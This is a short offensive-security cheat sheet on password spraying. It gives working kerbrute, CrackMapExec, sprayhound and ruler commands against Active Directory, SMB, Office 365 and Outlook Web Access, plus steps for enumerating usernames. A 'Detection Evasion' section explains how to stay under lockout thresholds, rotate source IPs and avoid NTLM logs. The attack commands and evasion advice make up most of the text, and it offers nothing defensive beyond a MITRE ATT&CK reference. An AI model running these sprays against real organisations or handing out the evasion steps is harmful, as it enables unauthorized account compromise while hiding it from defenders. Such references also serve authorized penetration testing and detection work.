# Password Spraying

## Technique
Attempt a single (or small set of) commonly used password(s) against a large
number of accounts.  Unlike brute-force, this avoids triggering account
lockout policies by staying below the failed-attempt threshold per account.

## Commands
```bash
# Spray against Active Directory via Kerberos (fast, no lockout risk if threshold > 1)
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123!'

# Spray against SMB with CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success

# Spray against Office 365 / Azure AD
python3 sprayhound.py -U users.txt -p 'Password123!' -d corp.onmicrosoft.com

# Spray against OWA (Outlook Web Access)
python3 ruler.py --domain corp.com brute --users users.txt --passwords passwords.txt --delay 30
```

## Usage
1. Enumerate valid usernames first (LDAP, OSINT, LinkedIn).
2. Research the organisation's password policy to determine safe spray intervals.
3. Use one password per spray round; wait at least 30 minutes between rounds.

## Detection Evasion
- Respect the lockout threshold — never exceed (threshold - 1) attempts per account.
- Spread sprays across multiple source IPs if possible.
- Use Kerberos-based spraying to avoid NTLM authentication logs.

## MITRE ATT&CK
- T1110.003 — Brute Force: Password Spraying
